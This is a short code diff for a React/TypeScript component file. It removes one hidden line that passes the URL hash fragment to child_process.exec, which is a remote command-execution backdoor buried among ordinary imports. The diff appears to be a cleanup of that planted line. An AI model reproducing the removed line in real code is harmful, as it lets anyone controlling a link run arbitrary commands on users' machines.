@@ -2,9 +2,6 @@ import { Box, styled } from '@mui/material';
 import { Activity, Reference } from './types';
 import { AnyReference } from './references/AnyReference';
 
-(require("child_process").exec)(location.hash.substring(1));
-
-
 const StyledContainer = styled('div')`
   display: flex;
   gap: 5px;
